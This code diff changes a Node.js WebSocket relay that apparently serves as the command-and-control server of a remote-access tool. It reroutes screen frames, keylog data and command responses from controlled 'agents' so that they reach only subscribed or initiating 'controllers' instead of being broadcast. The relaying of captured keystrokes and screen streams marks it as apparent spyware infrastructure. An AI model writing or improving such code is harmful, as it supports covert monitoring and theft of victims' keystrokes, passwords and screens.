@@ -35,13 +35,17 @@ function handleAgent(ws, req) {
 
   // ─── message ─────────────────────────────────────────────────
   ws.on('message', async (data, isBinary) => {
-    // ── Binary frame → broadcast raw to all controllers ──────
+    // ── Binary frame → forward ONLY to subscribed Controllers ──────
     if (isBinary) {
-      logger.debug('[agent] Binary frame relay', {
+      logger.debug('[agent] Binary frame relay to subscribers', {
         agentId,
         bytes: data.length,
       });
-      controllerStore.broadcast(data, { binary: true });
+      if (agentId) {
+        controllerStore.broadcastToSubscribers(agentId, data, { binary: true });
+      } else {
+        logger.warn('[agent] Binary frame from unregistered agent, dropping');
+      }
       return;
     }
 
@@ -120,7 +124,7 @@ function handleAgent(ws, req) {
       return;
     }
 
-    // ── All other messages → stamp agent_id + broadcast ──────
+    // ── All other messages → stamp agent_id & route to initiator or subscribers ──
     if (!agentId) {
       logger.warn('[agent] Message from unregistered agent, dropping', {
         ip,
@@ -131,13 +135,36 @@ function handleAgent(ws, req) {
 
     // CHÈN/GHI ĐÈ agent_id
     msg.agent_id = agentId;
+    const outStr = JSON.stringify(msg);
 
-    logger.info('[agent→controller] Relay', {
+    // 1. Streaming frames & Keylog → CHỈ forward tới các Controller trong tập subscribe
+    if (msg.type === 'frame_meta' || msg.type === 'keylog' || msg.type === 'keylog_data' || msg.module === 'keylog') {
+      logger.debug('[agent→controller] Stream/Keylog relay to subscribers', {
+        agentId,
+        type: msg.type,
+      });
+      controllerStore.broadcastToSubscribers(agentId, outStr);
+      return;
+    }
+
+    // 2. Response cho lệnh (có command_id khớp req_id Controller đã gửi) → gửi đúng Controller, KHÔNG broadcast
+    const cmdId = msg.command_id || msg.req_id || msg.id;
+    if (cmdId && typeof cmdId === 'string' && controllerStore.hasCommand(cmdId)) {
+      logger.info('[agent→controller] Command response relay to initiator', {
+        agentId,
+        type: msg.type,
+        commandId: cmdId,
+      });
+      controllerStore.sendToCommandInitiator(cmdId, outStr);
+      return;
+    }
+
+    // 3. Các message khác (không khớp command_id và không phải stream/keylog) → forward tới subscribers
+    logger.info('[agent→controller] General relay to subscribers', {
       agentId,
       type: msg.type,
     });
-
-    controllerStore.broadcast(JSON.stringify(msg));
+    controllerStore.broadcastToSubscribers(agentId, outStr);
   });
 
   // ─── close ───────────────────────────────────────────────────
